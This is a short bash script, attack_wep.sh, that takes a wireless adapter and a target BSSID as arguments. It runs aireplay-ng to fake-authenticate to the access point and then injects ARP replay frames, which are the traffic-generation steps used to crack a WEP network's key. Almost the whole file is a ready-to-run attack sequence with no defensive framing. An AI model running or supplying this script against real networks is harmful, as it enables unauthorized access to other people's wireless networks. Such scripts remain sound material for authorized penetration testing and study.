#!/bin/bash

# Arg1 = Wifi Device
# Arg2 = BSSID
num_args=2	# number of arguments

if [ ! $num_args -eq $#  ]; then 
	echo "Error: invalid usage."
	echo "    ./attack_wep.sh <adapter> <bssid> "
	exit 1
fi

ifconfig_result=$( ifconfig $1 )
if [ ! $? -eq 0 ];then
	echo "Adapter does not exist. Do you have root?"
	exit 1
fi

echo "Fakeauth to $2"
sleep 2

aireplay-ng --fakeauth 0 -a $2  mon0 --ignore-negative-one
if [ ! $? -eq 0 ];then
	echo "Fakeauth failed."
	exit 1
fi

sleep 2
echo "Beginning to inject frames (ARP REPLAY)"
sleep 2

aireplay-ng --arpreplay -b $2  $1 --ignore-negative-one

